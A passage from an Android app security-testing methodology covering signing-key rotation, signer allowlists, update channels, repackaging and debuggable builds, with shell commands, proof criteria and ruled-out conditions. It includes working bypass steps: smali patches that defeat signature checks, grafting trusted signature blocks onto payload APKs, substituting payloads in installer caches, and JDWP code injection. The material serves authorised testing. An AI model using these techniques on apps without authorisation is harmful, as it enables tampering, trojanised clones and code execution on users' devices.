- **Ruled out when:** The signer DN is the client's own organisation (cross-check against the Play Console app signing key per D02-006), and the signature algorithm is SHA-256 or stronger. Note that a debug-*signed* build handed to you as "release" may simply be the wrong artefact — check D02-033 (`testOnly`) before writing this up as a production finding.

### D02-016 · v3.1 rotation split-brain: a different authoritative key per SDK range

| | |
|---|---|
| **Severity ceiling** | Medium — High when a signature-protected custom permission or a peer signature check is satisfied by the pre-rotation key on a device the app still supports |
| **VRT** | `broken_access_control.privilege_escalation` (varies, rated on what the permission guards) |
| **Attacker** | AM-03 (an app signed with the historical key, on a pre-Android-13 device) |
| **Applies to** | Apps using APK Signature Scheme v3.1 (Android 13+ signing). The split-brain effect manifests on Android 12L and lower. |
| **Maps to** | developer.android.com/about/versions/13/features (v3.1, `apksigner --rotation-min-sdk-version`, "backward compatible with Android 12L and lower"); AOSP "Security enhancements", Android 13: "APK signature scheme v3.1 — new default for key rotations" |

- **Test:** v3.1 lets a developer rotate signing keys **only for SDK versions at or above `--rotation-min-sdk-version`**, keeping the old key authoritative below it. Establish which key actually authorises updates and sibling-app trust on the OS version you are testing.
- **How:**
```bash
apksigner verify --verbose --print-certs base.apk
apksigner verify --min-sdk-version 24 --max-sdk-version 32 --print-certs base.apk
apksigner verify --min-sdk-version 33 --print-certs base.apk      # may show the rotated cert
```
- **Proof:** Two different certificate digests printed for the two SDK ranges — proof that the app's signature-level permissions and `checkSignatures()` peers resolve to *different* keys depending on OS version. Then show a stub app signed with the pre-rotation key being granted a signature permission on a pre-13 device.
- **Escalation:** -> D03 custom-permission spoofing by a co-signed attacker app on pre-13 devices; -> D06 if the permission gates a bound service.
- **Ruled out when:** Both SDK-range invocations of `apksigner verify --print-certs` return the same certificate digest (no rotation in force), **or** the app's `minSdkVersion` is 33 or above so no device ever resolves to the pre-rotation key, **or** the pre-rotation key is still exclusively controlled by the client and is used by no other party.

### D02-017 · `knownSigner` / `android:knownCerts` allowlist enumeration

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (varies — rated on what the permission guards) |
| **Attacker** | AM-03 / AM-08 (a low-trust partner build, or anyone holding a rotated-away key in the list) |
| **Applies to** | **Android 12+** (the `knownSigner` protection level, `PROTECTION_FLAG_KNOWN_SIGNER` = 0x8000). **LEGACY note running the other way:** on older platforms the same manifest resolves the level to plain `signature`, which is *stricter* — the newer device is the weaker one. |
| **Maps to** | developer.android.com/guide/topics/manifest/permission-element ("Granted only if requesting app is signed with an allowed certificate... Automatically granted without user notification"); `PermissionInfo.PROTECTION_FLAG_KNOWN_SIGNER` |

- **Test:** `knownSigner` grants a permission to any app whose signing certificate appears in a hard-coded allowlist, *not* only to apps with the same current signature. Enumerate the allowlist — any party holding one of those keys, including a deprecated partner or a rotated-away old key, takes the permission automatically and silently.
- **How:**
```bash
grep -nE 'knownSigner|knownCerts' out/AndroidManifest.xml
grep -rn 'knownCerts' out/res/values/*.xml          # the digest list is usually a string-array resource
adb shell pm list permissions -f | grep -B2 -A3 -i knownSigner
```
  In jadx also look for hand-rolled lineage checks: `PackageManager.hasSigningCertificate(`, `GET_SIGNING_CERTIFICATES`, `SigningInfo.getSigningCertificateHistory(`.
- **Proof:** A `protectionLevel` string containing `knownSigner` plus a resolvable `android:knownCerts` array of SHA-256 digests. The finding is demonstrating that an APK signed with a *historical* (rotated-out) or third-party key in that array is granted the permission — install such a stub and show the permission granted in `dumpsys package <stub> | sed -n '/install permissions/,/runtime permissions/p'`.
- **Escalation:** Grants whatever the `knownSigner` permission guards — commonly an internal provider (-> D07) or an AIDL admin interface (-> D06).
- **Ruled out when:** No `knownSigner` protection level appears in the merged manifest, **or** every digest in `android:knownCerts` corresponds to a key the client currently controls and can account for (ask; a digest nobody can name is a finding in itself).

### D02-018 · Update-identity continuity: a differently-signed build must be refused

| | |
|---|---|
| **Severity ceiling** | High (Critical if the app's own updater accepts the artefact — see D02-027) |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) as the baseline, overridden upward with a code-execution proof; the P5 sibling `...executable_download.secure_integrity_check` is what you get when a signature *is* checked |
| **Attacker** | AM-09 malicious backend/CDN; AM-03 for the local-install variant |
| **Applies to** | All. On `targetSdk >= 26` the in-app installer requires `REQUEST_INSTALL_PACKAGES` — note whether the target declares it. |
| **Maps to** | AOSP security-model §4.7.1 item (5): "an update can only be installed if the new APK is signed with the same identity or by an identity that was delegated by the original signer"; `REQUEST_INSTALL_PACKAGES` as a special permission |

- **Test:** Confirm the platform boundary holds, then confirm no side channel goes around it — an in-app updater, an OEM installer hook, a `PackageInstaller.Session` flow.
- **How:**
```bash
grep -n 'REQUEST_INSTALL_PACKAGES' out/AndroidManifest.xml
grep -rnE 'PackageInstaller|ACTION_INSTALL_PACKAGE|application/vnd\.android\.package-archive|setInstallerPackageName' out/sources/
adb install -r resigned.apk      # MUST fail: INSTALL_FAILED_UPDATE_INCOMPATIBLE
```
- **Proof:** `adb install -r` returning `INSTALL_FAILED_UPDATE_INCOMPATIBLE: ... signatures do not match previously installed version` proves the platform boundary holds. A *successful* install proves either that the package was uninstalled first (not a finding) or that the app's own updater accepts an unpinned artefact (a finding — go to D02-027).
- **Escalation:** A successful side-channel install is remote code execution as the app; on a `sharedUserId` app it compromises every sibling too (-> D03).
- **Ruled out when:** `adb install -r` with a differently-signed build fails with `INSTALL_FAILED_UPDATE_INCOMPATIBLE` **and** no `PackageInstaller` / `ACTION_INSTALL_PACKAGE` / `vnd.android.package-archive` call site exists in the decompiled tree **and** `REQUEST_INSTALL_PACKAGES` is absent from the merged manifest. Check all three — the manifest permission is the cheapest tell and is often present because an SDK added it (-> D02-044).

### D02-019 · The app's own signer check reads `GET_SIGNATURES` / `signatures[0]` instead of `hasSigningCertificate`

| | |
|---|---|
| **Severity ceiling** | High (when the check is the only gate on an exported component returning session material); Medium otherwise |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); escalates to `broken_access_control.privilege_escalation` (varies) |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | All. v3 rotation from Android 9; v3.1 the rotation default from Android 13; `GET_SIGNING_CERTIFICATES` from API 28. |
| **Maps to** | MASWE-0011 (Improper Verification of Cryptographic Signature); AOSP "Security enhancements", Android 13 |

- **Test:** Apps that gate a privileged IPC path on "is the caller signed by us" frequently read the legacy `PackageInfo.signatures` array. Under v3 key rotation the historical certificate is still presented, so a rotated-away key satisfies a naive check. Determine which API the app uses and whether it compares the full chain or only `signatures[0]`.
- **How:**
```bash
grep -rnE 'GET_SIGNATURES|GET_SIGNING_CERTIFICATES|signingInfo|hasSigningCertificate|getApkContentsSigners|getSigningCertificateHistory|checkSignatures' out/sources/
```
  In jadx, follow the comparison. Weak forms: `pi.signatures[0].hashCode()`, a hardcoded SHA-1 of a cert, `getSigningCertificateHistory()` treated as a trust set. Correct form: `PackageManager.hasSigningCertificate(pkg, cert, PackageManager.CERT_INPUT_SHA256)`.
- **Proof:** Decompiled code comparing only `pi.signatures[0]` (or trusting the history array), alongside `apksigner verify -v --print-certs base.apk` showing the app's own block carries a v3 rotation lineage. Then install a stub signed with the historical key and show the privileged IPC path answering it.
- **Escalation:** -> D06 (bound-service authorisation) -> D03 (`sharedUserId` and signature permissions). Also a hard prerequisite break for the `createPackageContext` mitigation in D02-050.
- **Ruled out when:** Every call site uses `hasSigningCertificate(..., CERT_INPUT_SHA256)` against a pinned current certificate, **or** the app has never rotated (single cert in `--print-certs`, no lineage) so `signatures[0]` and the current signer are the same value, **or** the check is not the only gate — a server-side authorisation on the same path makes the client check decorative rather than load-bearing.

### D02-020 · Installer-identity gating (`getInstallerPackageName` / `getInstallSourceInfo`)

| | |
|---|---|
| **Severity ceiling** | Low (enabler only) |
| **VRT** | `lack_of_binary_hardening.runtime_instrumentation_based` (P5) — never file standalone |
| **Attacker** | AM-03 |
| **Applies to** | All; `getInstallSourceInfo` from API 30, `getInstallerPackageName` on all levels |
| **Maps to** | HackTricks smali-changes.md ("Patching common anti-tamper checks"); local corpus ref 18 §L |

- **Test:** Apps that only trust `com.android.vending` as the installer can be defeated by installing via a spoofed installer package, without touching the signature-check code at all. Find whether this gate exists before you burn time on the signature routine.
- **How:**
```bash
grep -rnE 'getInstallerPackageName|getInstallSourceInfo|com\.android\.vending' out/sources/
# spoof the installer at install time:
adb install -i com.android.vending -r patched.apk
adb shell pm list packages -i | grep com.target.app     # shows the recorded installer
```
- **Proof:** `pm list packages -i` reporting `installer=com.android.vending` for a package you sideloaded, and the app's tamper path not firing.
- **Escalation:** Removes a gate that would otherwise block D02-022; on its own it is P5 and never reportable.
- **Ruled out when:** No installer-identity call site exists, **or** the value is sent to the server and the server actually acts on it (then test it per D02-021, which is the reportable variant).

### D02-021 · Client-computed integrity signal that the backend never validates

| | |
|---|---|
| **Severity ceiling** | Low standalone — report only as the enabling step of a repack-based Medium/High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.identity_check_value` (P4) |
| **Attacker** | AM-03 (attacker runs a repacked client) |
| **Applies to** | Apps that send a signature hash, installer name or integrity token as a header or body field |
| **Maps to** | sh4hin MobileApp-Pentest-Cheatsheet -> PiracyChecker (APK signature protection library) as the control under test; `bb-methodology` PART 4 Body-Diff Rule |

- **Test:** If the app computes a signing-certificate hash or `getInstallerPackageName()` and sends it as a header or field, determine whether the server validates it or merely logs it. A decorative anti-tamper signal is the reason a repack-based finding is real rather than theoretical.
- **How:** Find the value in the proxy (`X-App-Signature`, `installer`, `pkg_sig`, `X-Integrity-Token`), then send a garbage and an absent value on a sensitive call:
```bash
curl -s -o /tmp/base -w '%{http_code} %{size_download}\n' -H 'X-App-Signature: <real>' "$API/v1/me"
curl -s -o /tmp/gone -w '%{http_code} %{size_download}\n'                               "$API/v1/me"
curl -s -o /tmp/junk -w '%{http_code} %{size_download}\n' -H 'X-App-Signature: k9q2x7fd' "$API/v1/me"
diff /tmp/base /tmp/gone; diff /tmp/base /tmp/junk
```
- **Proof:** A **byte-level body diff**, not a status code. If all three bodies are byte-identical, the signal is decorative — that identity is the evidence. Conversely, a status-code-only claim ("it returned 200 without the header") is the single most common rejected-as-N/A category on bounty platforms; an edge or CDN layer routinely normalises a header away before the origin ever sees it.
- **Escalation:** Makes the D02-022 repack finding non-theoretical, and is the precondition for D23 entitlement flips surviving server-side.
- **Ruled out when:** Removing or corrupting the signal produces a different response body (a rejection, a step-up challenge, a distinct error code) reproducibly over n≥5 requests — and you confirmed the difference is in the body, not only the status line.

### D02-022 · Repack → re-sign → run: is there any runtime integrity check at all

| | |
|---|---|
| **Severity ceiling** | Support — **never** a finding standalone |
| **VRT** | `lack_of_binary_hardening.lack_of_obfuscation` (P5) / `mobile_security_misconfiguration.*` (P5). The reportable finding is always the consequence, never the repack. |
| **Attacker** | AM-03 for the resulting trojanised-clone story; AM-12 when you are only using it as a tool |
| **Applies to** | All; requires that the app does not enforce server-verified attestation (D02-024) |
| **Maps to** | Hrishikesh C17 "Missing Integrity Checks"; sec-88 checklist §17; HackTricks smali-changes.md; MASTG-TOOL-0011 (Apktool), MASTG-TOOL-0103 (uber-apk-signer) |

- **Test:** Decompile, alter a security-relevant branch, rebuild, sign with your own key, install. If the app runs normally, every client-side control (pinning, root detection, entitlement gates, licence checks) is a bypassable constant. **The finding is not the patch — it is that the backend has no equivalent check.**
- **How:**
```bash
apktool d -f -o out target.apk            # add -r if resource decoding fails
# ...edit smali / AndroidManifest.xml / res...
apktool b out -o dist/app-unsigned.apk
zipalign -P 16 -f -v 4 dist/app-unsigned.apk dist/app-aligned.apk
keytool -genkey -v -keystore key.jks -alias t -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=t"
apksigner sign --ks key.jks --out dist/app-signed.apk dist/app-aligned.apk
apksigner verify --verbose --print-certs dist/app-signed.apk
adb install -r dist/app-signed.apk
```
  Sign **once**: `jarsigner` before `zipalign`, or `apksigner` after — never both. Use `-P 16` when `lib/*.so` is present so native libs align for both 16 KiB and 4 KiB page-size devices. `jarsigner` alone produces v1-only signatures and will not install on API 24+/28+ targets — use `apksigner`.
  Split-APK apps: **every** split must be rebuilt and re-signed with the **same** key and installed together (see D02-041).
- **Proof:** The patched app launches, authenticates, and reaches the protected feature — no tamper dialog, no `finish()`/`System.exit()`, no telemetry-driven lockout — **and** the server returns a success response for the request the unpatched client could never send.
- **Escalation:** -> D23 (entitlement/price flag flips) -> D13 (auth gate removal) -> D21 (RASP removal) -> D14 (pinning removed, tokens captured). A repackagable app can also be redistributed as a trojanised clone that keeps the original package name and thereby inherits its deep links, App Links and any `<queries>`-based trust from other installed apps.
- **Ruled out when:** The rebuilt app refuses to run, loses its session on first launch, or is rejected server-side — **and** you identified the mechanism (D02-019 signer check, D02-024 attestation). "It crashed" is not a ruled-out: verify the rebuild is not simply broken per D02-023's `.locals` and `move-result` gotchas before concluding the app has a working integrity control.

### D02-023 · Locate and patch the in-app signer check rather than reimplementing it

| | |
|---|---|
| **Severity ceiling** | Support (tooling) |
| **VRT** | `lack_of_binary_hardening.runtime_instrumentation_based` (P5) — never filed |
| **Attacker** | AM-12 (this is your own tooling step) |
| **Applies to** | All apps whose rebuild fails at launch |
| **Maps to** | HackTricks smali-changes.md; sec-88 "Signing the APK" |

- **Test:** When repackaging breaks the app, find the signer-verification routine and patch the **final branch**, not the whole routine.
- **How:** Grep the smali tree and jadx output for the recognisable ingredients, then patch the last comparison before the error dialog / `finish()` / `System.exit()` / telemetry call:
```bash
grep -rnE 'GET_SIGNATURES|GET_SIGNING_CERTIFICATES|apkContentsSigners|MessageDigest|"SHA-256"|Base64|getInstallerPackageName|com\.android\.vending' out/smali*/ out/sources/
```
```smali
# force valid
const/4 v0, 0x1
# or invert the branch into the tamper handler
if-eqz v0, :tamper_detected   # original
if-nez v0, :tamper_detected   # patched
```
  Smali gotchas that break rebuilds: raise `.locals`, **not** `.registers` (parameter registers `p0..pN` map to the highest registers); `move-result*` must immediately follow its `invoke-*`; `long`/`double` consume a register pair; use `invoke-*/range` for many or high-numbered registers. Forgetting a `.locals` increment produces a verifier crash at launch — the usual failure mode.
- **Proof:** The rebuilt APK survives launch and reaches the gated feature; logcat no longer shows the tamper path.
- **Escalation:** Unblocks D02-022; also worth checking the `getInstallerPackageName` gate (D02-020) first, which is often the cheaper patch.
- **Ruled out when:** No signer-check ingredients appear in the decompiled tree, or the check is server-side (D02-024), in which case local patching cannot help and you must re-scope.

### D02-024 · Server-verified attestation: stop, and re-scope

| | |
|---|---|
| **Severity ceiling** | Support (scoping control) |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | Any app calling Play Integrity, a residual SafetyNet path, or a commercial RASP SDK with a server-side verdict check |
| **Maps to** | Local corpus ref 18 §L, ref 24 §A4.7; Play Integrity device labels `MEETS_DEVICE_INTEGRITY` / `MEETS_BASIC_INTEGRITY` / `MEETS_STRONG_INTEGRITY` / `MEETS_VIRTUAL_INTEGRITY` |

- **Test:** Before repacking, establish whether the integrity gate is local (hookable, patchable) or a **server-verified attestation** (not defeatable by any local hook). Getting this wrong costs hours.
- **How:**
```bash
grep -rnE 'SafetyNet|IntegrityManager|IntegrityTokenRequest|attest|StandardIntegrityManager' out/sources/
grep -rnE 'getInstallerPackageName|getInstallSourceInfo|GET_SIGNING_CERTIFICATES' out/sources/
adb logcat -d | grep -iE 'integrity|deviceRecognitionVerdict|MEETS_(DEVICE|BASIC|STRONG|VIRTUAL)_INTEGRITY|attest|rasp|rooted'
```
  Then look at the wire: does a token go to the client's own backend, and does the response differ when the device is rooted/emulated?
- **Proof:** The network request carrying the attestation token, and a materially different server response on an uncertified device. That is the attestation being *enforced*; if the response is identical, the attestation is decorative and belongs in D02-021.
- **Escalation:** If enforced, the D21 RASP surface is closed to instrumentation — re-scope to server-side testing (D15) rather than burning hours on Frida. If decorative, file per D02-021 and proceed with D02-022.
- **Ruled out when:** No attestation SDK is present, **or** the verdict is evaluated client-side only (you can see the branch in jadx and hook it), **or** the server response is byte-identical with and without a valid token.

### D02-025 · Custom APK verifier confusion: v3→v2 fallback and the unvalidated content digest

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) -> `server_side_injection.remote_code_execution_rce` (P1) equivalent impact when the target installs arbitrary apps under a trusted signer allowlist |
| **Attacker** | AM-03 zero-permission local app (places the artefact) / AM-09 (supplies it over the network) |
| **Applies to** | OEM app stores, plugin managers, enterprise/MDM installers, in-app updaters — any code path enforcing its **own** signer allowlist before handing a file to `PackageInstaller` |
| **Maps to** | HackTricks android-applications-basics.md ("Custom APK verifier confusion / mixed-scheme abuse"); the Samsung Galaxy Store / S25 five-bug chain (bugscale); MASWE-0011 |

- **Test:** Stores, updaters, plugin managers and enterprise installers that run their own signature check frequently disagree with the platform. Two classic errors: (a) falling back to v2 when a present v3 block fails signer validation; (b) verifying that the signature *over the embedded digest* is valid without recomputing the digest from the APK contents. The Samsung chain had both — "it checks that the signature over the digest present in the signature block is valid, but it does not check that the APK data hashes to the same digest."
- **How:**
```bash
jadx -d src target.apk
grep -rnE 'ApkSignatureSchemeV2Verifier|ApkSigningBlock|APK Sig Block 42|GET_SIGNATURES|GET_SIGNING_CERTIFICATES|verifySignature|MessageDigest' src/ | grep -v android/support
# build a payload with the expected package name, sign v3-only with your key
apksigner sign --ks key.jks --out payload-v3.apk \
  --v1-signing-enabled false --v2-signing-enabled false --v3-signing-enabled true payload.apk
apksigner verify --verbose --print-certs payload-v3.apk
# transplant a trusted APK's v2 signing block onto the payload (graft_sig.py-style)
```
  Red flags in the verifier code: a v2 fallback on v3 signer-validation failure; a v2 check that never recomputes the content digest; package-name or metadata checks not bound to the file body.
- **Proof:** The target's own verifier accepts the grafted APK — its "valid signature" log line or dialog fires and the install proceeds — while `apksigner verify --print-certs` on the *same file* shows **your** v3 certificate.
- **Escalation:** Pair with D02-026 to land the file where the updater picks it up without user confirmation, and with a D07 path-traversal write to place it (the bugscale chain wrote to `/data/data/com.sec.android.app.samsungapps/files/samsungapps-<productID>-<fileSize>-<versionCode>`).
- **Ruled out when:** The app hands the file straight to `PackageInstaller` with no verification of its own (then the platform's verifier is authoritative and this item does not apply — go to D02-027), **or** the verifier recomputes the content digest from the APK bytes and compares it to the signed digest, **or** it rejects on any v3 signer-validation failure without falling back.

### D02-026 · Deterministic installer cache: artefact substitution before install

| | |
|---|---|
| **Severity ceiling** | High — Critical when the flow auto-installs helper APKs or plugins without user confirmation |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) as the baseline, overridden upward by the demonstrated install |
| **Attacker** | AM-03 zero-permission local app (writing to a shared path) or AM-04 with legacy storage access |
| **Applies to** | Apps with a self-update, plugin, or "shell APK" install path |
| **Maps to** | HackTricks android-applications-basics.md ("Deterministic installer cache / artifact substitution") |

- **Test:** If a store, updater or helper downloads an installable artefact to a **deterministic path** and decides "already downloaded" from existence plus size only (e.g. `file.length() >= expectedSize`), writing attacker bytes to that exact path makes the next trigger install your artefact.
- **How:** Find the destination in jadx (look for a path built from productID/size/versionCode), then:
```bash
adb shell run-as com.target sh -c 'ls -l files/ cache/ no_backup/ 2>/dev/null'
adb shell ls -l /sdcard/Android/data/com.target/cache/          # externally writable staging
# place the payload at the exact path and pad to >= expectedSize, then fire the trigger
adb shell 'cat /sdcard/payload.apk > /sdcard/Android/data/com.target/cache/<exact-name>'
adb shell am start -a android.intent.action.VIEW -d "<trigger deep link>"
```
- **Proof:** The install flow proceeds **without re-downloading** and installs your APK/plugin; `pm list packages -i` shows the target app recorded as the installer of a package you supplied.
- **Escalation:** Pair with D02-025 to also pass the app's custom signer check; -> D07 if the write primitive is a FileProvider path traversal rather than a shared directory.
- **Ruled out when:** The destination path incorporates a server-supplied nonce or content hash, **or** the app verifies the downloaded file's digest against a server-supplied value before install, **or** the staging directory is app-private and no write primitive reaches it (prove that by attempting the write as a zero-permission app, not by reading the manifest).

### D02-027 · Self-hosted / side-loaded update channel without pinned signature verification

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4 baseline, CWE-494) — override upward with the code-execution proof; `insecure_os_firmware.weakness_in_firmware_updates.firmware_does_not_validate_update_integrity` (P3) for device/OEM scope |
| **Attacker** | AM-09 malicious backend/CDN; AM-06 network attacker if the fetch is cleartext or unpinned |
| **Applies to** | All apps with an out-of-Play update path (enterprise, regional, OEM). On `targetSdk >= 26` the installer requires `REQUEST_INSTALL_PACKAGES`. ATT&CK M1006: apps targeting **API 29+** cannot execute *native* code from internal data storage — DEX and JS second stages are **not** blocked and remain fully current. |
| **Maps to** | ATT&CK T1407 Download New Code at Runtime, T1661 Application Versioning ("An adversary may push an update to a previously benign application to add malicious code"; SharkBot S1055), T1544 Ingress Tool Transfer, mitigation M1006; MASWE-0049 (CWE-494); MASVS-CODE-3 |

- **Test:** Can the app fetch and run code after install — a DEX/JAR/SO/AAB fragment, a JS bundle, a plugin, a full APK? Then: is the artefact signature-verified against a **pinned** key, and is the fetch over pinned TLS?
- **How:**
```bash
grep -rnE 'PackageInstaller|ACTION_INSTALL_PACKAGE|application/vnd\.android\.package-archive|\.apk"' out/smali/ out/sources/ | head -50
grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|System\.load\(|System\.loadLibrary\(|dlopen' out/sources/
grep -rnE 'CodePush|expo-updates|EXUpdates|hot.?update|patch\.jar|bundleUrl' out/sources/
adb shell "ls -la /data/data/com.target.app/files /data/data/com.target.app/code_cache 2>/dev/null"
```
```javascript
// prove the loader path and capture the file it consumes
Java.perform(function () {
  var DCL = Java.use('dalvik.system.DexClassLoader');
  DCL.$init.overload('java.lang.String','java.lang.String','java.lang.String','java.lang.ClassLoader')
    .implementation = function (p,o,l,c) { console.log('[T1407] DexClassLoader <- ' + p); return this.$init(p,o,l,c); };
  var Rt = Java.use('java.lang.Runtime');
  Rt.load.overload('java.lang.String').implementation = function (p) { console.log('[T1407] System.load <- ' + p); return this.load(p); };
});
```
  Then serve a re-signed APK (or a substituted DEX/SO) from the same URL through the proxy and confirm the app hands it to the installer or the loader.
- **Proof:** A packet capture showing the artefact fetched over a channel you control, plus the on-screen installer prompt for **your** package (screen recording of the client's own UI offering your APK is the deliverable), **or** for the loader variant a marker file written from inside the app's UID by your payload's static initialiser — use an 8+ character random marker (`/data/data/<pkg>/files/zq7k4mx2`), never `PWNED` or `test`, and confirm the marker string does not already occur anywhere in the baseline app.
- **Escalation:** RCE in the app UID gives you every local-storage, Keystore and session primitive at once — chain into D11, D12 and D13 and report as one Critical. -> D14 if the fetch is cleartext or MitM-able, which changes the attacker from a supply-chain insider to any hostile network. -> D24 if the URL arrives in a push payload; -> D09 if it arrives in a deep link.
- **Ruled out when:** No dynamic-load or install call site exists in the shipped code, **or** the downloaded artefact's signature is verified against a key pinned in the app (show the verification code and that it fails closed on a substituted file), **or** the fetch is certificate-pinned *and* the artefact is signed *and* the load path is a read-only app-private file. Absence of a `REQUEST_INSTALL_PACKAGES` permission rules out the APK-install variant but **not** the DEX/JS variant.

### D02-028 · The app enables unknown-sources installation or installs other packages

| | |
|---|---|
| **Severity ceiling** | High — Critical if the install is silent (device owner) or the URL is fetched over cleartext/unpinned TLS |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) with an upward override on the demonstrated install |
| **Attacker** | AM-02 remote one click (the user accepts a prompt from a trusted app) / AM-09 |
| **Applies to** | All. `REQUEST_INSTALL_PACKAGES` is per-app from **Android 8**; before that a single global "unknown sources" toggle applied — **LEGACY**. |
| **Maps to** | ATT&CK T1632.001 Code Signing Policy Modification (Dvmap, Mandrake "can enable app installation from unknown sources"), T1544, T1632; mitigations M1006, M1011, M1012 |

- **Test:** Does the app hold `REQUEST_INSTALL_PACKAGES`, drive the user to the unknown-sources settings screen, or call `PackageInstaller`? An app that can install other APKs is a distribution channel; if the APK URL is attacker-influenceable it is a malware-delivery vector wearing the client's brand.
- **How:**
```bash
aapt2 dump permissions base.apk | grep -E 'REQUEST_INSTALL_PACKAGES|INSTALL_PACKAGES|DELETE_PACKAGES'
grep -rnE 'PackageInstaller|ACTION_INSTALL_PACKAGE|ACTION_MANAGE_UNKNOWN_APP_SOURCES|Settings\.ACTION_SECURITY_SETTINGS|setInstallerPackageName' out/sources/
# where does the URL come from?
grep -rn -B4 -A4 '\.apk' out/sources/ | grep -nE 'getString|Uri\.parse|intent\.getData|remoteConfig|fcm|payload'
```
- **Proof:** MitM the config or push that supplies the APK URL, substitute your own signed test APK, and record the client app launching the install prompt for **your** package.
- **Escalation:** -> D09 (a deep link that supplies the URL gives a one-click, no-permission-prompt chain from a web page to an install prompt); -> D24 (push-delivered URL); -> D18 (remote-config-delivered URL).
- **Ruled out when:** The permission is absent and no `PackageInstaller` call site exists, **or** the APK URL is a compile-time constant pointing at a pinned, certificate-verified host and the artefact's signature is checked before the install intent is raised. An SDK-contributed `REQUEST_INSTALL_PACKAGES` (see D02-043) still counts — attribute it, do not dismiss it.

### D02-029 · `android:debuggable="true"` in a release build → private-storage read on a stock device

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | The flag alone is `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) — you override it with the reachability proof. The extracted credential routes to `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) or `insecure_os_firmware.hardcoded_password.non_privileged_user` (P2) if static. |
| **Attacker** | AM-03 zero-permission local app / AM-11 physical unlocked (anyone who picks up the phone with USB debugging on) |
| **Applies to** | All. Release builds default to `false`, so any `true` is an explicit build mistake. |
| **Maps to** | MASTG-TEST-0226 (Debuggable Flag Enabled in the AndroidManifest), MASWE-0063 (CWE-489), MASVS-RESILIENCE-4, MASTG-KNOW-0007, MASTG-TECH-0150, MASTG-TECH-0117; ATT&CK T1409 Stored Application Data, T1533, T1623.001; developer.android.com/privacy-and-security/risks/android-debuggable |

- **Test:** Detect the flag three independent ways (a repacked or SDK-injected build can differ from what you expect), then **use it** — the flag is not the finding, the extracted credential is. MASTG itself links Android's note that the flag "is not considered a direct vulnerability"; do not hand a triager the flag.
- **How:**
```bash
aapt2 dump badging base.apk | grep -i debuggable            # prints "application-debuggable"
adb shell dumpsys package com.target.app | grep -Ei 'flags=.*DEBUGGABLE|pkgFlags='
adb shell getprop ro.debuggable                             # 0 on a production device image
adb shell getprop ro.build.type                             # must read "user" for the claim to hold
# then actually use it, as a normal non-root shell:
adb shell run-as com.target.app id
adb shell run-as com.target.app ls -la /data/data/com.target.app/{shared_prefs,databases,files}
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml
```
  drozer equivalent: `run app.package.debuggable -f com.target`.
- **Proof:** `run-as` returning `uid=10xxx(u0_aXXX)` and a directory listing of the private data dir on a **stock, non-rooted, production (`ro.build.type=user`)** device, with an actual bearer token / refresh token / PAN / password in the output. Then replay that token against the production API from your own machine and screenshot the 200 with victim data. `run-as` succeeding is the *operational* proof; the manifest flag and `dumpsys` line are only declarations.
- **Escalation:** The extracted token is the input to every D15 IDOR/BOLA test; a static credential becomes P1 if it authenticates to an internet-facing service. Also -> D02-030 (JDWP code execution), -> D02-031 (`adb backup` re-enabled), -> D11, -> D12, -> D13.
- **Ruled out when:** `aapt2 dump badging` prints no `application-debuggable` line **and** `adb shell run-as com.target.app id` fails with `run-as: package not debuggable` on a `ro.build.type=user` device. Both — a userdebug test image makes `run-as` succeed regardless of the app, which is a harness artefact, not a finding. Check every flavour and variant the client ships, not just the Play build.

### D02-030 · Debuggable build → JDWP attach → arbitrary code in the app's UID

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the in-process execution mints or reads a live session; the primitive itself is rated by what it yields |
| **Attacker** | AM-03 / AM-11 |
| **Applies to** | All debuggable builds, all API levels — this legacy check is fully alive |
| **Maps to** | MASTG-TECH-0031 (Debugging), MASTG-TECH-0040 (Waiting for the Debugger), MASTG-TOOL-0019 (jdb); drozer `app.package.debuggable`, `exploit.jdwp.check` |

- **Test:** `android:debuggable="true"` allows a JDWP debugger to attach and execute arbitrary code **inside the app's process, with its UID and permissions** — no root, no Frida, no instrumentation the app can detect as instrumentation. This is the path when Frida is detected or the app crashes under hooking.
- **How:**
```bash
adb jdwp                                  # the PID appears here only if debuggable
adb forward tcp:8700 jdwp:<pid>
jdb -attach localhost:8700
```
```
stop in com.target.app.security.BridgeGate.isAllowed
locals
print this.allowList
set this.allowList = "*"
```
  drozer's `exploit.jdwp.check` states the mechanism verbatim: *"Open @jdwp-control and see which applications connect. This is an issue because then drozer can act as a debugger for the connected application. This could be used to invoke arbitrary code within the context of the debuggable application."*
- **Proof:** `jdb` breaking in the app's own classes and printing/modifying locals, plus the changed behaviour on screen. Screenshot the `adb jdwp` PID list and the `jdb` session together.
- **Escalation:** -> D12 (call the Keystore-backed decrypt routine **in-process**, defeating a "the key never leaves Keystore" design without extracting any key) -> D13 (read the session object directly) -> D10 (read exactly what a WebView allow-list compares).
- **Ruled out when:** The package's PID never appears in `adb jdwp` on a `ro.build.type=user` device. The `@jdwp-control` global path in drozer's `exploit.jdwp.check` is a legacy device-level check — on modern Android the per-app `debuggable` flag is the live vector, so a negative on the global check does not rule this out.

### D02-031 · Debuggable re-enables `adb backup` at targetSdk 31+

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5) for the flag; the extracted credential routes to `sensitive_data_exposure.disclosure_of_secrets.*` (P1–P3) |
